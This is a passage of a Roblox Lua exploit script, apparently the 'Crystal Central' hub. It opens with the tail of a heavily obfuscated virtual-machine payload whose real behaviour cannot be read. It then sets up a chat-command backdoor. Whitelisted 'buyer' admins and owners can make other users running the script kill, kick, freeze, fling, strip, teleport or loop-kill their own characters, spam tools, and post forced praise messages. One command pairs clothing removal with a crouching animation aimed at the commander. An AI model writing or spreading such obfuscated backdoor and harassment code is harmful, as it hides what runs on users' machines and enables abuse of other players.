111";{926;235;975;938};"1 + 1 = 111";"1 + 1 = 111";{969;892;160;206};{778;89;836;399};{298;865;140;487};"1 + 1 = 111";{396;934;18;226};{489;620;355;883};"1 + 1 = 111";{857;959;697;559};{666;833;528;497};{148;4;577;799};{157;925;557;339};}then if new_IIlIlIlllIIIIIllIl<=#("oMcFXbiuloZJ2")then new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("3e")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("zOH")]];elseif new_IIlIlIlllIIIIIllIl>#("arJ6o0la2sKs1n")then new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("1I")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("hz0")]][new_IllIIlllIlIllIllIl[#("rVV6")]];else new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("Jp")]]=new_IllIlIIIlIII[new_IllIIlllIlIllIllIl[#("VgL")]];end;elseif new_IIlIlIlllIIIIIllIl<=#("5JyKEi5mHny4XpKh")then local new_IllIIlllIlIllIllIl=new_IllIIlllIlIllIllIl[#("Dt")]new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl](new_IllIlIIlIlIIllllIIIlIII(new_IlIllllIIIIlIIIIIIlI,new_IllIIlllIlIllIllIl+1,new_IIlIIIlIllIIlll))elseif new_IIlIlIlllIIIIIllIl==#("xu00l4CjxoTT4Fk4C")then local new_IlIIIlIlllIlIllIlIIII=new_IllIIlllIlIllIllIl[#("IO")]new_IlIllllIIIIlIIIIIIlI[new_IlIIIlIlllIlIllIlIIII]=new_IlIllllIIIIlIIIIIIlI[new_IlIIIlIlllIlIllIlIIII](new_IllIlIIlIlIIllllIIIlIII(new_IlIllllIIIIlIIIIIIlI,new_IlIIIlIlllIlIllIlIIII+1,new_IllIIlllIlIllIllIl[#("jfZ")]))else new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("ox")]][new_IllIIlllIlIllIllIl[#("oNl")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("rZ1s")]];end;elseif new_IIlIlIlllIIIIIllIl<=#("PC9zyeebT15yUsly6GxbU")then if new_IIlIlIlllIIIIIllIl<=#("5Ag3lENTmava5Pm77WW")then new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("ov")]]=new_IllIlIIIlIII[new_IllIIlllIlIllIllIl[#{"1 + 1 = 111";{10;609;79;600};"1 + 1 = 111";}]];elseif new_IIlIlIlllIIIIIllIl==#("lLn9EBHGJPIAF9GJrE2L")then local new_IIlIlIlllIIIIIllIl;new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("K8")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("lxF")]][new_IllIIlllIlIllIllIl[#("ieNu")]];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("RN")]]=new_IllIIlllIlIllIllIl[#("XGi")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("2o")]]=new_IllIIlllIlIllIllIl[#("2ZC")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("uT")]]=new_IllIIlllIlIllIllIl[#("ZQE")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("SG")]]=new_IllIIlllIlIllIllIl[#("HLS")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IIlIlIlllIIIIIllIl=new_IllIIlllIlIllIllIl[#("Ao")]new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl]=new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl](new_IllIlIIlIlIIllllIIIlIII(new_IlIllllIIIIlIIIIIIlI,new_IIlIlIlllIIIIIllIl+1,new_IllIIlllIlIllIllIl[#("b6o")]))new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("vF")]][new_IllIIlllIlIllIllIl[#("Wgi")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("bPin")]];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#{"1 + 1 = 111";{386;282;641;621};}]][new_IllIIlllIlIllIllIl[#("KNh")]]=new_IllIIlllIlIllIllIl[#("Eg47")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#{{184;164;447;416};"1 + 1 = 111";}]]=new_IllIlIIIlIII[new_IllIIlllIlIllIllIl[#("F3W")]];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("36")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("3a4")]][new_IllIIlllIlIllIllIl[#{{541;86;452;31};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];else do return end;end;elseif new_IIlIlIlllIIIIIllIl<=#("aO5bUxGl8ILpLDumhzV6gjI")then if new_IIlIlIlllIIIIIllIl==#("5F5jOPD3lUl6r7UdbuKg6j")then new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("UT")]][new_IllIIlllIlIllIllIl[#("8s2")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("0KOb")]];else local new_IIlIlIlllIIIIIllIl;new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("zt")]]=new_IllIlIIIlIII[new_IllIIlllIlIllIllIl[#("Oqg")]];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IIlIlIlllIIIIIllIl=new_IllIIlllIlIllIllIl[#{{555;58;986;332};"1 + 1 = 111";}]new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl]=new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl](new_IllIlIIlIlIIllllIIIlIII(new_IlIllllIIIIlIIIIIIlI,new_IIlIlIlllIIIIIllIl+1,new_IllIIlllIlIllIllIl[#("joJ")]))new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("PR")]][new_IllIIlllIlIllIllIl[#("r1M")]]=new_IllIIlllIlIllIllIl[#("MKEU")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#{{508;983;257;617};"1 + 1 = 111";}]][new_IllIIlllIlIllIllIl[#("hQe")]]=new_IllIIlllIlIllIllIl[#{{679;270;20;667};"1 + 1 = 111";{112;712;746;24};{360;429;370;336};}];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("RZ")]][new_IllIIlllIlIllIllIl[#("x5S")]]=new_IllIIlllIlIllIllIl[#("mdCn")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("zZ")]][new_IllIIlllIlIllIllIl[#("Scd")]]=new_IllIIlllIlIllIllIl[#("SlnU")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];do return end;end;elseif new_IIlIlIlllIIIIIllIl==#("GlxkehOs0gDfpCxHsfSe0ry4")then local new_IIIIllIllIIIlIIIlIIIIll;local new_llIIlllIlIlIIIlllIIllIIll,new_lIlIlIIIllIlIIlIllI;local new_lIlllIIlllIIIIlIII;local new_IIlIlIlllIIIIIllIl;new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("92")]]=new_IllIlIIIlIII[new_IllIIlllIlIllIllIl[#("3Sd")]];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("yi")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("QCt")]][new_IllIIlllIlIllIllIl[#("k0X5")]];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("mS")]]=new_IllIIlllIlIllIllIl[#("d4k")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("q8")]]=new_IllIlIIIlIII[new_IllIIlllIlIllIllIl[#("aKc")]];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IIlIlIlllIIIIIllIl=new_IllIIlllIlIllIllIl[#("8L")];new_lIlllIIlllIIIIlIII=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("dvh")]];new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl+1]=new_lIlllIIlllIIIIlIII;new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl]=new_lIlllIIlllIIIIlIII[new_IllIIlllIlIllIllIl[#{{252;882;507;823};"1 + 1 = 111";"1 + 1 = 111";{36;276;365;175};}]];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("Ns")]]=new_IllIIlllIlIllIllIl[#("rHN")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IIlIlIlllIIIIIllIl=new_IllIIlllIlIllIllIl[#("XH")]new_llIIlllIlIlIIIlllIIllIIll,new_lIlIlIIIllIlIIlIllI=new_llllllllIllllIlllII(new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl](new_IllIlIIlIlIIllllIIIlIII(new_IlIllllIIIIlIIIIIIlI,new_IIlIlIlllIIIIIllIl+1,new_IllIIlllIlIllIllIl[#("6o2")])))new_IIlIIIlIllIIlll=new_lIlIlIIIllIlIIlIllI+new_IIlIlIlllIIIIIllIl-1 new_IIIIllIllIIIlIIIlIIIIll=0;for new_IllIIlllIlIllIllIl=new_IIlIlIlllIIIIIllIl,new_IIlIIIlIllIIlll do new_IIIIllIllIIIlIIIlIIIIll=new_IIIIllIllIIIlIIIlIIIIll+1;new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl]=new_llIIlllIlIlIIIlllIIllIIll[new_IIIIllIllIIIlIIIlIIIIll];end;new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IIlIlIlllIIIIIllIl=new_IllIIlllIlIllIllIl[#{{773;433;582;199};{23;386;333;405};}]new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl]=new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl](new_IllIlIIlIlIIllllIIIlIII(new_IlIllllIIIIlIIIIIIlI,new_IIlIlIlllIIIIIllIl+1,new_IIlIIIlIllIIlll))new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("bu")]]=new_IllIlIIIlIII[new_IllIIlllIlIllIllIl[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("Er")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("nkP")]][new_IllIIlllIlIllIllIl[#("JALH")]];else local new_IlIllllIlIllIIIlIIllIllI=new_IllIIlllIlIllIllIl[#("VF")];local new_IlIIIlIlllIlIllIlIIII=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("kce")]];new_IlIllllIIIIlIIIIIIlI[new_IlIllllIlIllIIIlIIllIllI+1]=new_IlIIIlIlllIlIllIlIIII;new_IlIllllIIIIlIIIIIIlI[new_IlIllllIlIllIIIlIIllIllI]=new_IlIIIlIlllIlIllIlIIII[new_IllIIlllIlIllIllIl[#("Blyi")]];end;new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;end;end);end;return new_IIIlIllllIIIllIllll(true,{},new_IllllIllIllIIlIll())();end)(string.byte,table.insert,setmetatable);
			end
		end

		if message:sub(1, 12) == "cc!juicewrld" then
			if message:match(game.Players.LocalPlayer.Name) then
				local plr = game.Players.LocalPlayer
				game.Players.LocalPlayer.Character.Shirt:Destroy()
				game.Players.LocalPlayer.Character.Pants:Destroy()
				wait(2)
				game.Players[plr].Character.Humanoid.Sit = true
				plr.Character.HumanoidRootPart:Destroy()
				plr.Character:WaitForChild("Humanoid").Jump = true
			end
		end

		if message:sub(1, 7) == "cc!goto" then
			if message:match(game.Players.LocalPlayer.Name) then
				local plr = game.Players.LocalPlayer
				game[author].LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.Head.CFrame
			end
		end

		-- kill start
		if message:sub(1, 7) == "cc!kill" then
			if message:match(game.Players.LocalPlayer.Name) then
				local plr = game.Players.LocalPlayer
				game.Players.LocalPlayer.Character.Humanoid.Health = 0
			end
		end
		--  kill end
		-- kick start
		if message:sub(1, 7) == "cc!kick" then
			if message:match(game.Players.LocalPlayer.Name) then
				local plr = game.Players.LocalPlayer
				game.Players.LocalPlayer:Kick("\nYou were kicked by an Crystal Central booster. \n["..author.."]")

			end
		end

		if message:sub(1, 9) == "cc!freeze" then
			if message:match(game.Players.LocalPlayer.Name) then
				game.Players.LocalPlayer.Character.Head.Anchored = true
			end
		end

		if message:sub(1, 11) == "cc!unfreeze" then
			if message:match(game.Players.LocalPlayer.Name) then
				game.Players.LocalPlayer.Character.Head.Anchored = false
			end
		end

		if message:sub(1, 7) == "cc!benx" then
			if message:match(game.Players.LocalPlayer.Name) then
				local plr = game.Players.LocalPlayer
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
				local Crouch = plr.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
				Crouch.Looped = true
				Crouch:Play()
				game:GetService("RunService"):BindToRenderStep("ew", 0, function()
					for i,v in pairs(plr:GetChildren()) do
						v.Character.Humanoid:MoveTo(game.Players[author].Character.Head.Position)
					end
				end)
				game.Players.LocalPlayer.Character.Shirt:Destroy()
				game.Players.LocalPlayer.Character.Pants:Destroy()
			end	
		end
	end

	if message:sub(1, 9) == "cc!unbenx" then
		if message:match(game.Players.LocalPlayer.Name) then
			local plr = game.Players.LocalPlayer
			game.Players.LocalPlayer.Character.Humanoid.Health = 0
		end
	end

	if message:sub(1, 9) == "cc!shield" then
		if message:match(game.Players.LocalPlayer.Name) then
			local shielded = {

			}

			local plrID = game:GetService('Players'):FindFirstChild(game.Players.Name).UserId
			table.insert(shielded, plrID) 

			for i,_ in pairs(shielded) do
				if table.find(shielded[i]["UserId"], player.UserId) then
					if admin then
						table.remove(admin, plrID)
					elseif owner then
						table.remove(owner, plrID)
						if message:sub(1, 11) == "cc!unshield" then
							if message:match(game.Players.LocalPlayer.Name) then
								table.insert(admin, plrID)
								table.remove(shielded, plrID)
							end	
						end
					end	
				end
			end
		end
	end

	if message:sub(1, 11) == "cc!loopkill" then
		if message:match(game.Players.LocalPlayer.Name) then
			_G.killing = true
			if _G.killing == true then
				while wait(20) do
					local plr = game.Players.LocalPlayer
					game.Players.LocalPlayer.Character.Humanoid.Health = 0
				end
			end
		end
	end

	if message:sub(1, 13) == "cc!unloopkill" then
		if message:match(game.Players.LocalPlayer.Name) then
			_G.killing = false
			if _G.killing == true then
				while wait(20) do
					local plr = game.Players.LocalPlayer
					game.Players.LocalPlayer.Character.Humanoid.Health = 0
				end
			end
		end
	end

	if message:sub(1, 12) == "cc!spamtools" then
		if message:match(game.Players.LocalPlayer.Name)  then
			while true do
				wait(1)
				local tool = Instance.new("Tool")
				tool.Name = "noob"
				tool.Parent = game.Players.LocalPlayer.Backpack
				tool.ToolTip = "noob"
			end
		end 
	end

	if message:sub(1, 9) == "cc!praise" then
		local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
		path:FireServer("Praise me!","all")
		if message:match(game.Players.LocalPlayer.Name) then
			local plr = game.Players.LocalPlayer
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
			local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
			path:FireServer("Ok! Praise, for the master "..author.."!","all")
			local PrayingAnimation = Instance.new("Animation")
			PrayingAnimation.Name = "PrayingAnimation"
			PrayingAnimation.AnimationId = "rbxassetid://3487719500"
			local Praying = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(PrayingAnimation)
			Praying:Play()
		end
	end		

	if message:sub(1, 8) == "cc!fling" then
		if message:match(game.Players.LocalPlayer.Name) then
			local plr = game.Players.LocalPlayer
			plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
		end
	end

	-- kick end
	if message:sub(1, 7) == "cc!bind" then
		local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
		path:FireServer("Praise, for the master "..author.."!","all")
	end

	if owner then
		if message:sub(1, 6) == "cc!ban" then
			if message:match(game.Players.LocalPlayer.Name) then
				game.ReplicatedStorage.MainEvent:FireServer("CHECKER_1", p2)
			end
		end

		if owner then
			if message:sub(1, 12) == "cc!blacklist" then
				local blacklisted = {
					{
						UserId  = 0,
						Reason = "A booster has blacklisted you."
					}
				}
				if message:match(game.Players.LocalPlayer.UserID) then
					local plrID = game:GetService('Players'):FindFirstChild(game.Players.Name).UserId

					for i,_ in pairs(blacklisted) do
						if table.find(blacklisted[i]["UserId"], player.UserId) then
							player:Kick("You are blacklisted from this script for the reason: "..blacklisted[i["Reason"]])
						end
					end
					if message:sub(1, 14) == "cc!unblacklist" then
						if message:match(game.Players.LocalPlayer.UserID) then
							table.remove(blacklisted, plrID)
						end
					end
				end
			end
		end	

		if message:sub(1, 9) == "cc!rejoin" then
			if message:match(game.Players.LocalPlayer.Name) then
				local TeleportService = game:GetService("TeleportService")
				TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
			end
		end
	end
end

-- // Admin
for i,v in pairs(game.Players:GetChildren()) do
	for i ,_ in pairs(whitelist.admin) do
		if v.UserId == _ then
			admin = true
			if admin then
				warn('New admin : '..v.Name)
				v.Chatted:Connect(function(msg)
					print(v.Name.. " said "..msg)
					runcommand(msg,v.Name)
				end)
			end
		end
	end  
end
game.Players.PlayerAdded:Connect(function(player)
	for i ,_ in pairs(whitelist.admin) do
		if player.UserId == _ then
			admin = true
			if admin then
				warn('New admin : '..player.Name)
				game.StarterGui:SetCore("SendNotification", {
					Title = "Crystal Central [Buyers]";
					Text = "Mod prems loaded, this only for buyers we fixed it! Please dm crystal central if you have any problems.";
					Duration = 15;
				})
				player.Chatted:Connect(function(msg)
					runcommand(msg,player.Name)
				end)
			end
		end
	end   
end)

-- // Owner

for i,v in pairs(game.Players:GetChildren()) do
	for i ,_ in pairs(whitelist.owner) do
		if v.UserId == _ then
			owner = true
			if owner then
				game.StarterGui:SetCore("SendNotification", {
					Title = "Crystal Central [Owners]";
					Text = "Owner Mod prems loaded, this only for buyers we fixed it! Please dm crystal central if you have any problems.";
					Duration = 15;
				})
				warn('New owner : '..v.Name)
				v.Chatted:Connect(function(msg)
					print(v.Name.. " said "..msg)
					runcommand(msg,v.Name)
				end)
			end
		end
	end  
end
game.Players.PlayerAdded:Connect(function(player)
	for i ,_ in pairs(whitelist.owner) do
		if player.UserId == _ then
			owner = true
			if owner then
				warn('New owner : '..player.Name)
				game.StarterGui:SetCore("SendNotification", {
					Title = "Crystal Central [Owners]";
					Text = "Owner Mod prems loaded, this only for buyers we fixed it! Please dm crystal central if you have any problems.";
					Duration = 15;
				})
				player.Chatted:Connect(function(msg)
					runcommand(msg,player.Name)
				end)
			end
		end
	end   
end)
